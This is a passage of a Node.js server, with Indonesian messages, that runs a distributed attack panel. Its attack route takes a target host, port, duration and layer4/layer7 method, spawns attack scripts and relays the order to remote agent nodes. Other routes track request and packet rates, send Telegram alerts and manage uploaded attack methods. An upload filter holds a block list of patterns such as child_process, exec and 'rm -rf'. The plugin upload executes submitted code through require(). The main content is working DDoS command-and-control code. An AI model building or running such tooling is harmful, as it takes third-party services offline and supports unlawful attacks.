      resolved: scriptPath
    });
    throw new Error(errMsg);
  }

  if (!fs.existsSync(scriptPath)) {
    const errMsg = `Script file "${scriptPath}" tidak ditemukan`;
    logActivity('SPAWN_SCRIPT_MISSING', {
      processId,
      scriptPath,
      safeName
    });
    throw new Error(errMsg);
  }

  const spawnOpts = {
    stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH }
  };
  let ls;
  if (ext === '.sh') ls = spawn('sh', [scriptPath, ...args], spawnOpts);
  else if (ext === '.js') ls = spawn('node', [scriptPath, ...args], spawnOpts);
  else {
    const errMsg = `Ekstensi file tidak dikenali: ${ext}`;
    logActivity('SPAWN_SCRIPT_UNKNOWN_EXT', { processId, ext });
    throw new Error(errMsg);
  }

  activeProcesses[processId] = {
    ls,
    scriptName: safeName,
    args,
    status: 'running',
    lastResponse: Date.now(),
    restartCount: 0
  };

  activeProcesses[processId]._watchdog = startProcessWatchdog(processId);

  stats[processId] = {
    rps: 0,
    pps: 0,
    bps: 0,
    _tempRps: 0,
    _tempPps: 0,
    _tempBps: 0
  };
  startStatsAggregator(processId);

  ls.stdout.on('data', (data) => {
    withProcessLock(processId, async () => {
      const output = data.toString();
      if (activeProcesses[processId]) {
        activeProcesses[processId].lastResponse = Date.now();
        activeProcesses[processId].status = 'running';
      }
      if (!stats[processId]) return;

      const lines = output.split(/\r?\n/);
      for (const line of lines) {
        const rpsMatches = [...line.matchAll(/RPS[:=]?\s*(\d+)/gi)];
        const ppsMatches = [...line.matchAll(/PPS[:=]?\s*(\d+)/gi)];
        const bpsMatches = [...line.matchAll(/BPS[:=]?\s*(\d+)/gi)];
        for (const m of rpsMatches)
          stats[processId]._tempRps += parseInt(m[1], 10);
        for (const m of ppsMatches)
          stats[processId]._tempPps += parseInt(m[1], 10);
        for (const m of bpsMatches)
          stats[processId]._tempBps += parseInt(m[1], 10);
      }
    });
  });

  ls.stderr.on('data', (data) => {
    withProcessLock(processId, async () => {
      if (activeProcesses[processId]) activeProcesses[processId].status = 'error';
      if (stats[processId]?._interval) clearInterval(stats[processId]._interval);
      if (activeProcesses[processId]?._watchdog)
        clearInterval(activeProcesses[processId]._watchdog);
      delete stats[processId];
      delete activeProcesses[processId];

      logActivity('PROCESS_STDERR', { processId, error: data.toString() });
      await sendTelegramPhoto(
        `❗️ *Proses error*\n` +
          `*PID:* \`${ls.pid}\`\n` +
          `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
          `*Error:*\n\`\`\`\n${escapeTelegram(
            data.toString()
          )}\n\`\`\``
      );
    });
  });

  ls.on('error', (err) => {
    if (activeProcesses[processId]) activeProcesses[processId].status = 'crashed';
    if (stats[processId]?._interval) clearInterval(stats[processId]._interval);
    if (activeProcesses[processId]?._watchdog)
      clearInterval(activeProcesses[processId]._watchdog);
    delete stats[processId];
    delete activeProcesses[processId];

    logActivity('PROCESS_CRASHED', { processId, error: err.toString() });
    sendTelegramPhoto(
      `💥 *Proses crash*\n` +
        `*PID:* \`${ls?.pid || 'unknown'}\`\n` +
        `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
        `*Error:*\n\`\`\`\n${escapeTelegram(
          err.toString()
        )}\n\`\`\``
    );
  });

  ls.on('close', (code) => {
    withProcessLock(processId, async () => {
      if (stats[processId]?._interval) clearInterval(stats[processId]._interval);
      if (activeProcesses[processId]?._watchdog)
        clearInterval(activeProcesses[processId]._watchdog);
      delete stats[processId];
      delete activeProcesses[processId];

      let status = 'stopped';
      if (code === 0) status = 'success';
      else if (code === 1) status = 'failed';
      else if (code === 'stopped_by_user') status = 'stopped';

      updateAttackHistory(processId, {
        endTime: new Date().toISOString(),
        status,
        exitCode: code
      });

      logActivity('PROCESS_EXITED', {
        processId,
        exitCode: code,
        finalStatus: status
      });
      await sendTelegramPhoto(
        `🛑 *Proses selesai*\n` +
          `*PID:* \`${ls.pid}\`\n` +
          `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
          `*Exit code:* \`${code}\`\n` +
          `*Status:* \`${status}\``
      );
    });
  });

  return { processId, ls, scriptName: safeName, args };
}

// Memory stats helper
function getMemStats() {
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMemoryMB = Math.round((totalMem - freeMem) / 1024 / 1024);
  const totalMemoryMB = Math.round(totalMem / 1024 / 1024);
  const memoryUsagePercent = totalMemoryMB
    ? Math.round((100 * usedMemoryMB) / totalMemoryMB)
    : 0;
  return { usedMemoryMB, totalMemoryMB, memoryUsagePercent };
}

/* =============================================================================
 * 18) ATTACK ROUTES
 * ========================================================================== */

app.get(
  '/api/attack',
  limiterAttack,
  requireRoleLimit(),
  validateApiKey,
  validateBlacklist,
  async (req, res) => {
    try {
      const { host, port: targetPort, time, method, user, concurrent } =
        req.query;
      if (!host || !targetPort || !time || !method) {
        return res.status(400).json({ error: 'Parameter tidak lengkap' });
      }

      const portNum = parseInt(targetPort, 10);
      const timeNum = parseInt(time, 10);
      if (!Number.isFinite(portNum) || portNum < 1 || portNum > 65535) {
        return res
          .status(400)
          .json({ error: 'Port harus berupa angka 1-65535' });
      }
      if (!Number.isFinite(timeNum) || timeNum <= 0) {
        return res
          .status(400)
          .json({ error: 'Durasi waktu harus berupa angka positif' });
      }

      if (Object.keys(activeProcesses).length >= GLOBAL_MAX_CONCURRENT) {
        return res
          .status(429)
          .json({ error: 'Terlalu banyak proses aktif, coba lagi nanti.' });
      }

      if (isSystemUnderPressure()) {
        return res
          .status(503)
          .json({ error: 'Server dalam tekanan memori, coba lagi nanti.' });
      }

      const methods = readMethods();
      const selected = methods[method];
      if (!selected) return res.status(400).json({ error: 'Metode tidak valid' });

      const args = selected.args.map((arg) => {
        if (typeof arg === 'string' && arg.startsWith('<') && arg.endsWith('>')) {
          if (arg === '<host>') return host;
          if (arg === '<port>') return targetPort;
          if (arg === '<time>') return time;
        }
        return arg;
      });

      const processId = `${method}-${Date.now()}`;
      let proc = null;

      if (NODE_TYPE === 'master' && (!AGENT_KEY || AGENT_KEY.length < 5)) {
        logActivity('ERROR_ATTACK_AGENTKEY_INVALID', { AGENT_KEY });
        return res.status(500).json({
          error:
            'AGENT_KEY belum dikonfigurasi dengan benar di master (panjang < 5 karakter atau kosong).'
        });
      }

      const shouldExecute =
        NODE_TYPE === 'agent' ||
        (NODE_TYPE === 'master' && MASTER_ATTACK_SELF);

      if (shouldExecute) {
        try {
          proc = spawnAttackScript(selected.script, args, processId);
          logActivity('START_ATTACK', {
            processId,
            host,
            targetPort,
            time,
            method,
            pid: proc.ls?.pid || null,
            args
          });
        } catch (e) {
          logActivity('START_ATTACK_SPAWN_FAILED', {
            processId,
            error: e.message,
            script: selected.script
          });
          return res
            .status(500)
            .json({ error: `Gagal menjalankan script: ${e.message}` });
        }
      }

      await sendTelegramPhoto(
        `🔥 *Serangan dimulai (${NODE_TYPE})*\n` +
          `🛡️ *Host:* \`${escapeTelegram(host)}\`\n` +
          `🎯 *Port:* \`${escapeTelegram(targetPort)}\`\n` +
          `⏱️ *Durasi:* \`${escapeTelegram(time + 's')}\`\n` +
          `⚔️ *Metode:* \`${escapeTelegram(method)}\`\n` +
          `🆔 *Process ID:* \`${escapeTelegram(processId)}\`\n` +
          `🔢 *PID:* \`${proc?.ls?.pid || 'N/A'}\``
      );

      logAttackHistory({
        processId,
        startTime: new Date().toISOString(),
        endTime: null,
        host,
        port: targetPort,
        method,
        duration: time,
        concurrent,
        status: 'running',
        who: user || 'unknown',
        masterOrAgent: NODE_TYPE
      });

      if (NODE_TYPE === 'master') {
        broadcastWS({
          type: 'attack_started',
          processId,
          host,
          port: targetPort,
          method,
          time
        });
      }

      let agentResults = [];
      if (NODE_TYPE === 'master') {
        loadAgents();

        const requestedConcurrent = parseInt(concurrent, 10);
        let activeAgents = [];

        if (!isNaN(requestedConcurrent) && requestedConcurrent > 0) {
          activeAgents = getBestAgents(requestedConcurrent);
        } else {
          activeAgents = getBestAgents(AGENT_LIST.length);
        }

        if (!isNaN(requestedConcurrent) && activeAgents.length < requestedConcurrent) {
          logActivity('WARNING_AGENT_LIMIT', {
            requested: requestedConcurrent,
            available: activeAgents.length
          });
        }

        const limit = pLimit(Math.max(5, getAgentQueryLimit()));
        agentResults = await Promise.all(
          activeAgents.map((agent) =>
            limit(() =>
              axiosProxyAware(
                {
                  method: 'get',
                  url: `${agent.url}/api/attack`,
                  params: { key: AGENT_KEY, host, port: targetPort, time, method },
                  timeout: 13000,
                  validateStatus: (s) => s >= 200 && s < 300
                },
                { useProxy: false }
              )
                .then((r) => {
                  if (r.data?.processId) {
                    agentProcessMap[r.data.processId] = {
                      agentName: agent.name,
                      agentUrl: agent.url
                    };
                    activeProcesses[r.data.processId] = {
                      agentName: agent.name,
                      agentUrl: agent.url,
                      isAgent: true
                    };
                  }
                  return { agent, status: 'success', data: r.data };
                })
                .catch((e) => ({ agent, status: 'failed', error: e.message }))
            )
          )
        );

        if (!shouldExecute && NODE_TYPE === 'master') {
          const successCount = agentResults.filter(
            (r) => r.status === 'success'
          ).length;
          const failCount = agentResults.filter(
            (r) => r.status === 'failed'
          ).length;

          let finalStatus = 'running';
          if (successCount > 0 && failCount === 0) finalStatus = 'success';
          else if (successCount === 0 && failCount > 0) finalStatus = 'failed';
          else if (successCount > 0 && failCount > 0) finalStatus = 'partial';

          updateAttackHistory(processId, {
            endTime: new Date().toISOString(),
            status: finalStatus
          });

          broadcastWS({
            type: 'attack_completed',
            processId,
            status: finalStatus
          });

          await sendTelegramPhoto(
            `✅ *Serangan selesai (agent-only)*\n` +
              `🆔 *Process ID:* \`${escapeTelegram(processId)}\`\n` +
              `📊 *Status:* \`${finalStatus}\`\n` +
              `📦 *Berhasil:* ${successCount}, ❌ Gagal: ${failCount}`
          );
        }

        logActivity('MASTER_ATTACK', {
          host,
          targetPort,
          time,
          method,
          totalAgents: AGENT_LIST.length,
          usedAgents: activeAgents.length,
          agentResults
        });
      }

      return res.json({
        message: `Serangan dimulai (${NODE_TYPE})`,
        processId,
        pid: proc?.ls?.pid || null,
        agents: agentResults
      });
    } catch (err) {
      logActivity('ERROR_ATTACK', { error: err.toString() });
      res.status(500).json({ error: 'Kesalahan Internal Server' });
    }
  }
);

// STOP ALL ATTACK
app.get('/api/attack/stop', validateApiKey, async (_req, res) => {
  try {
    const pids = Object.keys(activeProcesses);
    pids.forEach((pid) => {
      if (activeProcesses[pid]?.ls) activeProcesses[pid].ls.kill('SIGINT');
      if (stats[pid]?._interval) clearInterval(stats[pid]._interval);
      if (activeProcesses[pid]?._watchdog)
        clearInterval(activeProcesses[pid]._watchdog);
      delete stats[pid];
      delete activeProcesses[pid];
      logActivity('STOP_PROCESS', { processId: pid, isMaster: true });
      broadcastWS({
        type: 'attack_stopped',
        processId: pid,
        exitCode: 'stopped_by_user'
      });
      updateAttackHistory(pid, {
        endTime: new Date().toISOString(),
        status: 'stopped',
        exitCode: 'stopped_by_user'
      });
    });

    loadAgents();
    const limit = pLimit(5);
    const agentResults = await Promise.all(
      AGENT_LIST.map((agent) =>
        limit(() =>
          axiosProxyAware(
            {
              method: 'get',
              url: `${agent.url}/api/attack/stop`,
              params: { key: AGENT_KEY },
              timeout: 30000,
              validateStatus: (s) => s >= 200 && s < 300
            },
            { useProxy: false }
          )
            .then((r) => ({ agent, status: 'success', data: r.data }))
            .catch((e) => ({ agent, status: 'failed', error: e.message }))
        )
      )
    );

    logActivity('MASTER_STOP', { agentResults });
    await sendTelegramPhoto(
      `🛑 *STOP broadcast ke agents & master:*\n` +
        agentResults
          .map(
            (r) =>
              `• \`${escapeTelegram(
                r.agent.name || r.agent.url
              )}\`: *${r.status}*`
          )
          .join('\n')
    );

    if (NODE_TYPE === 'master') broadcastWS({ type: 'all_stopped' });
    return res.json({
      message: 'Semua proses di master & agents dihentikan',
      results: agentResults
    });
  } catch (err) {
    logActivity('ERROR_STOP', { error: err.toString() });
    res.status(500).json({ error: 'Kesalahan Internal Server' });
  }
});

// STOP BY ID
app.post('/api/attack/stop-by-id', validateApiKey, async (req, res) => {
  const { processId } = req.body;
  try {
    if (!processId)
      return res.status(400).json({ error: 'processId tidak disediakan' });

    if (NODE_TYPE === 'agent') {
      const proc = activeProcesses[processId];
      if (!proc)
        return res
          .status(404)
          .json({ error: 'Process ID tidak ditemukan di agent ini' });
      if (proc.ls) proc.ls.kill('SIGINT');

      if (stats[processId]?._interval)
        clearInterval(stats[processId]._interval);
      if (activeProcesses[processId]?._watchdog)
        clearInterval(activeProcesses[processId]._watchdog);
      delete stats[processId];
      delete activeProcesses[processId];

      logActivity('STOP_PROCESS_AGENT', { processId, agent: true });
      return res.json({ message: `Proses ${processId} dihentikan di agent` });
    }

    const proc = activeProcesses[processId];
    if (proc?.ls) {
      proc.ls.kill('SIGINT');
      if (stats[processId]?._interval)
        clearInterval(stats[processId]._interval);
      if (activeProcesses[processId]?._watchdog)
        clearInterval(activeProcesses[processId]._watchdog);
      delete stats[processId];
      delete activeProcesses[processId];

      logActivity('STOP_PROCESS_MASTER', { processId });
      broadcastWS({
        type: 'attack_stopped',
        processId,
        exitCode: 'stopped_by_user'
      });
      updateAttackHistory(processId, {
        endTime: new Date().toISOString(),
        status: 'stopped',
        exitCode: 'stopped_by_user'
      });
    }

    const agentInfo = proc?.isAgent ? proc : agentProcessMap[processId];
    if (!agentInfo || !agentInfo.agentUrl) {
      return res
        .status(404)
        .json({ error: 'Tidak ada info agen untuk processId ini' });
    }

    try {
      const stopRes = await axiosProxyAware(
        {
          method: 'post',
          url: `${agentInfo.agentUrl}/api/attack/stop-by-id`,
          data: { key: AGENT_KEY, processId },
          timeout: 15000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: false }
      );
      logActivity('MASTER_STOP_BY_ID_AGENT', {
        processId,
        agent: agentInfo.agentName
      });
      return res.json({
        message: `Proses ${processId} dihentikan di agent`,
        agent: agentInfo.agentName,
        result: stopRes.data
      });
    } catch (err) {
      return res.status(500).json({
        error: `Gagal menghentikan proses di agent: ${err.message}`
      });
    }
  } catch (err) {
    logActivity('ERROR_STOP_BY_ID', { processId, error: err.message });
    res
      .status(500)
      .json({ error: 'Kesalahan internal saat menghentikan proses' });
  }
});

// ATTACK STATS
app.get('/api/attack/stats', validateApiKey, async (_req, res) => {
  const processStats = {};
  const pidMap = {};

  for (const pid in activeProcesses) {
    const proc = activeProcesses[pid];

    const rpsNum = Number(stats[pid]?.rps ?? 0) || 0;
    const ppsNum = Number(stats[pid]?.pps ?? 0) || 0;
    const bpsNum = Number(stats[pid]?.bps ?? 0) || 0;

    processStats[pid] = {
      status: proc.status,
      lastResponse: proc.lastResponse,
      restartCount: proc.restartCount || 0,
      pid: proc.ls?.pid,
      script: proc.scriptName,
      args: proc.args,
      rps: rpsNum,
      pps: ppsNum,
      bps: bpsNum,
      cpuPercent: stats[pid]?.cpuPercent ?? null,
      memoryMB: stats[pid]?.memoryMB ?? null,
      node: 'MASTER'
    };
    if (proc.ls?.pid) pidMap[pid] = proc.ls.pid;
  }

  try {
    const hasDashboardClient = clients.size > 0;
    if (Object.values(pidMap).length > 0) {
      const pidList = Object.values(pidMap);
      const BATCH_SIZE = 10;

      if (!hasDashboardClient) {
        // skip
      } else {
        for (let i = 0; i < pidList.length; i += BATCH_SIZE) {
          const batch = pidList.slice(i, i + BATCH_SIZE);
          try {
            // eslint-disable-next-line no-await-in-loop
            if (!shouldRunPidusage()) continue;
            const usageResult = await pidusage(batch);
            for (const [processId, pid] of Object.entries(pidMap)) {
              if (!batch.includes(pid)) continue;
              const usage = usageResult[pid];
              if (usage && processStats[processId]) {
                processStats[processId].cpuPercent = Number(
                  usage.cpu.toFixed(2)
                );
                processStats[processId].memoryMB = Math.round(
                  usage.memory / 1024 / 1024
                );
              }
            }
          } catch (err) {
            logActivity('PIDUSAGE_BATCH_ERROR', {
              error: err.message,
              batch
            });
          }
        }
      }
    }
  } catch (outerErr) {
    logActivity('PIDUSAGE_OUTER_FAIL', { error: outerErr.message });
  }

  const { usedMemoryMB, totalMemoryMB, memoryUsagePercent } = getMemStats();
  const load1m = Number(os.loadavg()[0].toFixed(2));

  if (NODE_TYPE === 'agent') {
    for (const k of Object.keys(processStats)) {
      processStats[k].node = 'AGENT';
    }
    return res.json({
      processStats,
      serverResource: {
        loadAvg1m: load1m,
        usedMemoryMB,
        totalMemoryMB,
        memoryUsagePercent,
        uptimeSeconds: Math.floor(process.uptime())
      }
    });
  }

  if (NODE_TYPE === 'master') {
    loadAgents();
    const agentResults = await Promise.all(
      AGENT_LIST.map(async (agent) => {
        const start = Date.now();
        try {
          const r = await axiosProxyAware(
            {
              method: 'get',
              url: `${agent.url}/api/attack/stats`,
              params: { key: AGENT_KEY },
              timeout: 30000,
              validateStatus: (s) => s >= 200 && s < 300
            },
            { useProxy: false }
          );
          const ping = Date.now() - start;
          return { agent, status: 'success', data: { ...r.data, ping } };
        } catch (err) {
          return { agent, status: 'failed', error: err.message };
        }
      })
    );

    const mergedProcessStats = { ...processStats };

    for (const resA of agentResults) {
      if (resA.status !== 'success') continue;
      const agent = resA.agent;
      const aData = resA.data || {};
      const aProcStats = aData.processStats || {};

      for (const [pid, stat] of Object.entries(aProcStats)) {
        const rpsVal = Number(stat.rps ?? 0) || 0;
        const ppsVal = Number(stat.pps ?? 0) || 0;
        const bpsVal = Number(stat.bps ?? 0) || 0;

        mergedProcessStats[pid] = {
          status: stat.status || 'running',
          lastResponse: stat.lastResponse || Date.now(),
          restartCount: stat.restartCount || 0,
          pid: stat.pid,
          script: stat.script,
          args: Array.isArray(stat.args) ? stat.args : [],
          rps: rpsVal,
          pps: ppsVal,
          bps: bpsVal,
          cpuPercent:
            typeof stat.cpuPercent === 'number'
              ? Number(stat.cpuPercent)
              : null,
          memoryMB:
            typeof stat.memoryMB === 'number'
              ? Math.round(stat.memoryMB)
              : null,
          node: 'AGENT',
          agentName: agent.name || agent.url,
          agentUrl: agent.url
        };
      }
    }

    const filteredProcessStats = {};
    const includeMaster = MASTER_ATTACK_SELF;
    for (const [pid, stat] of Object.entries(mergedProcessStats)) {
      const isMaster = stat.node === 'MASTER';
      if (isMaster && includeMaster) filteredProcessStats[pid] = stat;
      else if (!isMaster) filteredProcessStats[pid] = stat;
    }

    return res.json({
      master: {
        processStats: filteredProcessStats,
        serverResource: {
          loadAvg1m: load1m,
          usedMemoryMB,
          totalMemoryMB,
          memoryUsagePercent,
          uptimeSeconds: Math.floor(process.uptime())
        }
      },
      agentStats: agentResults
    });
  }

  res.json({
    processStats,
    serverResource: {
      loadAvg1m: load1m,
      usedMemoryMB,
      totalMemoryMB,
      memoryUsagePercent,
      uptimeSeconds: Math.floor(process.uptime())
    }
  });
});

// HISTORY & STATS DAILY
app.get('/api/attack/history', disableIfAgent(), validateApiKey, (_req, res) =>
  res.json(readHistory())
);

app.delete('/api/attack-history', disableIfAgent(), validateApiKey, (_req, res) => {
  try {
    fs.writeFileSync(historyPath, '[]', 'utf8');
    res.json({ message: 'Attack history cleared.' });
  } catch {
    res.status(500).json({ error: 'Gagal menghapus riwayat.' });
  }
});

app.get('/api/attack/stats/daily', disableIfAgent(), validateApiKey, (_req, res) => {
  const history = readHistory();
  const dailyStats = {};
  for (const entry of history) {
    if (!entry.startTime) continue;
    const date = new Date(entry.startTime).toISOString().split('T')[0];
    if (!dailyStats[date])
      dailyStats[date] = { total: 0, methods: {}, users: {}, agents: {} };
    dailyStats[date].total += 1;

    const method = entry.method || 'unknown';
    const who = entry.who || 'unknown';
    const agentName = entry.agentName || 'unknown';
    dailyStats[date].methods[method] =
      (dailyStats[date].methods[method] || 0) + 1;
    dailyStats[date].users[who] =
      (dailyStats[date].users[who] || 0) + 1;
    dailyStats[date].agents[agentName] =
      (dailyStats[date].agents[agentName] || 0) + 1;
  }
  res.json(dailyStats);
});

/* =============================================================================
 * 19) PLUGINS ROUTES
 * ========================================================================== */

app.get('/api/plugins/list', requireLogin, requireAdmin, (_req, res) => {
  loadPlugins();
  const plugins = fs
    .readdirSync(PLUGINS_DIR)
    .filter((f) => f.endsWith('.js') && !f.startsWith('_'))
    .map((file) => {
      const name = file.replace(/\.js$/, '');
      const disabled = readConfig()?.disabledPlugins || [];
      return { name, enabled: !disabled.includes(name) };
    });
  res.json({ plugins });
});

app.post('/api/plugins/:name/toggle', requireLogin, requireAdmin, (req, res) => {
  const name = req.params.name;
  const config = readConfig();
  config.disabledPlugins = config.disabledPlugins || [];

  const index = config.disabledPlugins.indexOf(name);
  let enabled;

  if (index === -1) {
    config.disabledPlugins.push(name);
    enabled = false;

    if (loadedPlugins[name]?.cleanup) {
      try {
        loadedPlugins[name].cleanup();
      } catch (e) {
        logActivity('PLUGIN_DISABLE_CLEANUP_ERROR', {
          plugin: name,
          error: e.message
        });
      }
    }
    delete loadedPlugins[name];
  } else {
    config.disabledPlugins.splice(index, 1);
    enabled = true;
    reloadPlugin(name);
  }

  writeConfig(config);
  res.json({ success: true, enabled });
});

app.post('/api/plugins/:name/reload', requireLogin, requireAdmin, (req, res) =>
  res.json({ success: reloadPlugin(req.params.name) })
);

// Upload plugin
const methodStorage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, uploadDir),
  filename: (_req, file, cb) => {
    if (!isValidFileName(file.originalname))
      return cb(new Error('Nama file tidak valid'));
    cb(null, file.originalname);
  }
});
const upload = multer({
  storage: methodStorage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (_req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    const allowed = ['.js', '.sh'];
    if (!allowed.includes(ext))
      return cb(new Error('Hanya file .js atau .sh yang diizinkan'));
    if (!isValidFileName(file.originalname))
      return cb(new Error('Nama file tidak valid'));
    cb(null, true);
  }
});

app.post(
  '/api/plugins/upload',
  disableIfAgent(),
  validateKeyAndLogin,
  upload.single('plugin'),
  async (req, res) => {
    if (!req.file)
      return res.status(400).json({ error: 'Tidak ada file plugin yang diupload' });

    const tempPath = req.file.path;
    const finalPath = path.join(PLUGINS_DIR, req.file.originalname);

    if (!isValidFileName(req.file.originalname)) {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      } catch {}
      return res.status(400).json({ error: 'Nama file plugin tidak valid' });
    }

    try {
      const content = fs.readFileSync(tempPath, 'utf8');
      if (!content.includes('exports.init =') && !content.includes('module.exports =')) {
        try {
          if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
        } catch {}
        return res
          .status(400)
          .json({ error: 'Plugin harus mengekspor fungsi init()' });
      }

      fs.renameSync(tempPath, finalPath);

      try {
        delete require.cache[require.resolve(finalPath)];
        const plugin = require(finalPath);
        if (typeof plugin.init !== 'function') {
          fs.unlinkSync(finalPath);
          return res
            .status(400)
            .json({ error: 'Plugin harus memiliki fungsi init()' });
        }
      } catch (loadErr) {
        fs.unlinkSync(finalPath);
        return res.status(400).json({
          error: `Validasi plugin gagal: ${loadErr.message}`,
          detail:
            process.env.NODE_ENV === 'development'
              ? loadErr.stack
              : undefined
        });
      }

      logActivity('PLUGIN_UPLOAD_SUCCESS', {
        plugin: req.file.originalname
      });
      res.json({
        message: 'Plugin berhasil diupload dan divalidasi',
        plugin: req.file.originalname
      });
    } catch (e) {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
        if (fs.existsSync(finalPath)) fs.unlinkSync(finalPath);
      } catch {}
      logActivity('PLUGIN_UPLOAD_ERROR', { error: e.message });
      res.status(500).json({
        error: 'Gagal mengupload plugin',
        detail: process.env.NODE_ENV === 'development' ? e.stack : undefined
      });
    }
  }
);

/* =============================================================================
 * 20) METHOD ROUTES (JSON METHODS) & METHOD FILES ROUTES
 * ========================================================================== */

// METHODS JSON
app.get('/api/methods', disableIfAgent(), validateApiKey, (_req, res) =>
  res.json(readMethods())
);

app.post('/api/methods', validateApiKey, (req, res) => {
  const { name, script, args, layer } = req.body;
  if (
    !name ||
    !script ||
    !Array.isArray(args) ||
    !['layer4', 'layer7'].includes(layer)
  ) {
    return res.status(400).json({ error: 'Input tidak valid' });
  }
  const methods = readMethods();
  if (methods[name])
    return res.status(409).json({ error: 'Method sudah ada' });
  methods[name] = { script, args, layer };
  writeMethods(methods);
  res.json({ success: true });
});

app.put('/api/methods/:name', disableIfAgent(), validateApiKey, (req, res) => {
  const { name, script, args, layer } = req.body;
  const oldName = req.params.name;

  if (
    !name ||
    !script ||
    !Array.isArray(args) ||
    !['layer4', 'layer7'].includes(layer)
  ) {
    return res.status(400).json({ error: 'Input tidak valid' });
  }

  const methods = readMethods();
  if (oldName !== name) delete methods[oldName];
  methods[name] = { script, args, layer };
  writeMethods(methods);

  res.json({ success: true });
});

app.delete(
  '/api/methods/:name',
  disableIfAgent(),
  validateApiKey,
  async (req, res) => {
    loadAgents();

    const methods = readMethods();
    const name = req.params.name;
    if (!methods[name])
      return res.status(404).json({ error: 'Method tidak ditemukan' });

    const scriptFile = methods[name].script;
    delete methods[name];
    writeMethods(methods);

    logActivity('DELETE_METHOD', { name, scriptFile });

    let fileDeleted = false;
    if (scriptFile) {
      const filePath = path.join(uploadDir, scriptFile);
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
        fileDeleted = true;
        logActivity('DELETE_METHOD_FILE_AUTO', { scriptFile });
      }
    }

    let results = [];
    if (NODE_TYPE === 'master' && AGENT_LIST?.length && scriptFile) {
      results = await Promise.all(
        AGENT_LIST.map((agent) =>
          axiosProxyAware(
            {
              method: 'post',
              url: `${agent.url}/api/methods/delete-file`,
              data: { key: AGENT_KEY, filename: scriptFile },
              timeout: 15000
            },
            { useProxy: false }
          )
            .then(() => ({ agent, status: 'success' }))
            .catch((e) => ({ agent, status: 'failed', error: e.message }))
        )
      );
      logActivity('SYNC_DELETE_METHOD_FILE_TIMESTAMP', {
        scriptFile,
        results
      });
    }

    res.json({ message: 'Method dihapus', name, fileDeleted, sync: results });
  }
);

// METHOD FILES MANAGEMENT
app.post(
  '/api/uploadmeth',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  upload.single('file'),
  validateApiKey,
  async (req, res) => {
    if (!req.file)
      return res.status(400).json({ error: 'Tidak ada file ter-upload' });

    const forbiddenNames = ['api.js', 'index.js', 'server.js'];
    const uploadedName = req.file.originalname.toLowerCase();
    const tempPath = req.file.path;

    if (
      forbiddenNames.includes(uploadedName) ||
      uploadedName.includes('..') ||
      !isValidFileName(uploadedName) ||
      uploadedName.startsWith('.')
    ) {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      } catch {}
      logActivity('BLOCK_UPLOAD_FILENAME', { file: uploadedName });
      return res.status(400).json({ error: 'Nama file tidak diizinkan.' });
    }

    let fileContent = '';
    try {
      fileContent = fs.readFileSync(tempPath, 'utf8');
      fileContent = fileContent.replace(/\0/g, '');
    } catch {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      } catch {}
      return res.status(400).json({ error: 'Gagal membaca isi file' });
    }

    const ext = path.extname(req.file.originalname).toLowerCase();
    if (ext === '.js') {
      const forbiddenJs = [
        /\brequire\s*\(\s*['"`]child_process['"`]\s*\)/,
        /\bspawn\s*\(/,
        /\bexec\s*\(/,
        /\bexecSync\s*\(/,
        /\bprocess\.exec\s*\(/,
        /\brm\s+-rf\b/
      ];
      for (const rx of forbiddenJs) {
        if (rx.test(fileContent)) {
          try {
            if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
          } catch {}
          logActivity('BLOCK_UPLOAD_SANDBOX', {
            file: req.file.filename,
            reason: rx.toString()
          });
          return res.status(400).json({
            error: `Upload diblokir: deteksi pola berbahaya ${rx}`
          });
        }
      }
    }

    for (const keyword of DANGEROUS_KEYWORDS) {
      if (fileContent.includes(keyword)) {
        try {
          if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
        } catch {}
        logActivity('BLOCK_UPLOAD', { file: req.file.filename, keyword });
        await sendTelegramPhoto(
          `🚫 *Upload file diblokir*\n` +
            `*Keyword berbahaya terdeteksi:* \`${escapeTelegram(
              keyword
            )}\`\n` +
            `*File:* \`${escapeTelegram(req.file.filename)}\``
        );
        return res.status(400).json({
          error: `Upload diblokir: terdeteksi keyword berbahaya ("${keyword}")`
        });
      }
    }

    const base = path.basename(req.file.originalname, ext);
    const uniqueSuffix = `${Date.now()}_${crypto
      .randomBytes(4)
      .toString('hex')}`;
    const finalName = `${base}_${uniqueSuffix}${ext}`;

    let destPath;
    try {
      destPath = getSafeFilePath(uploadDir, finalName);
    } catch (e) {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      } catch {}
      return res.status(400).json({ error: e.message });
    }

    try {
      fs.renameSync(tempPath, destPath);
      const statsInfo = fs.statSync(destPath);
      if (statsInfo.size > MAX_FILE_SIZE) {
        fs.unlinkSync(destPath);
        return res
          .status(400)
          .json({ error: 'File terlalu besar setelah proses upload' });
      }
    } catch {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      } catch {}
      return res.status(500).json({ error: 'Gagal menyimpan file' });
    }

    logActivity('UPLOAD_METHOD_FILE', {
      file: finalName,
      size: req.file.size
    });
    await sendTelegramPhoto(
      `📁 *File method baru di-upload*\n` +
        `*Nama:* \`${escapeTelegram(finalName)}\`\n` +
        `*Ukuran:* \`${req.file.size} bytes\``
    );

    res.json({
      message: 'File berhasil di-upload',
      fileName: finalName,
      path: `lib/method/${finalName}`
    });
  }
);

app.get('/api/method-files', disableIfAgent(), validateApiKey, async (_req, res) => {
  fs.readdir(uploadDir, async (err, files) => {
    if (err) return res.status(500).json({ error: 'Gagal membaca direktori' });
    try {
      const fileList = await Promise.all(
        files
          .filter((f) => !f.startsWith('.'))
          .map(async (f) => {
